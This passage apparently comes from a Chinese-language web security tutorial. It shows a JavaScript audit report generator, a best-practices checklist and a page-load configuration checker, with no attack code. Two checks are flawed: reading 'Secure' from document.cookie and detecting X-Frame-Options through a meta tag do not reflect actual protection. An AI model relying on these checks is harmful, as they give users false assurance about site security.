  generateReport() {
    const highIssues = this.issues.filter((issue) => issue.level === "high");
    const mediumIssues = this.issues.filter(
      (issue) => issue.level === "medium"
    );
    const lowIssues = this.issues.filter((issue) => issue.level === "low");

    const score = Math.max(
      0,
      100 -
        highIssues.length * 20 -
        mediumIssues.length * 10 -
        lowIssues.length * 5
    );

    return {
      score,
      level: score >= 80 ? "良好" : score >= 60 ? "一般" : "需要改进",
      issues: {
        high: highIssues,
        medium: mediumIssues,
        low: lowIssues,
      },
      recommendations: this.recommendations,
      summary: {
        total: this.issues.length,
        high: highIssues.length,
        medium: mediumIssues.length,
        low: lowIssues.length,
      },
    };
  }
}

// 运行安全审计
const auditor = new SecurityAuditor();
auditor.runFullAudit().then((report) => {
  console.log("安全审计报告:", report);

  if (report.issues.high.length > 0) {
    console.warn("发现高危安全问题:");
    report.issues.high.forEach((issue) => {
      console.warn(`- ${issue.category}: ${issue.description}`);
    });
  }
});
```

### 安全最佳实践清单

```javascript
// Web安全最佳实践
const securityBestPractices = {
  // 基础安全
  basics: [
    "始终使用HTTPS加密传输",
    "设置安全的Cookie属性",
    "实施内容安全策略(CSP)",
    "验证和清理所有用户输入",
    "使用最新版本的框架和库",
  ],

  // 认证和授权
  authentication: [
    "实施强密码策略",
    "使用多因素认证",
    "安全的会话管理",
    "适当的密码存储(哈希+盐)",
    "账户锁定机制",
  ],

  // 数据保护
  dataProtection: [
    "敏感数据加密存储",
    "数据传输加密",
    "最小权限原则",
    "定期清理敏感数据",
    "安全的API设计",
  ],

  // 监控和响应
  monitoring: [
    "安全事件日志记录",
    "异常行为检测",
    "定期安全审计",
    "事件响应计划",
    "安全意识培训",
  ],
};

// 安全配置检查器
function checkSecurityConfiguration() {
  const config = {
    https: location.protocol === "https:",
    csp: !!document.querySelector('meta[http-equiv="Content-Security-Policy"]'),
    xFrame: !!document.querySelector('meta[http-equiv="X-Frame-Options"]'),
    cookieSecure: document.cookie.includes("Secure"),
    noMixedContent: !document.querySelector(
      'script[src^="http:"], img[src^="http:"], link[href^="http:"]'
    ),
  };

  const score = Object.values(config).filter(Boolean).length;
  const total = Object.keys(config).length;

  console.log("安全配置检查:", {
    score: `${score}/${total}`,
    percentage: Math.round((score / total) * 100) + "%",
    details: config,
  });

  return config;
}

// 页面加载时检查安全配置
window.addEventListener("load", checkSecurityConfiguration);
```

---

_Web 安全是一个持续的过程，需要从多个层面进行防护。定期进行安全审计，保持对最新威胁的了解，是构建安全应用的关键。_
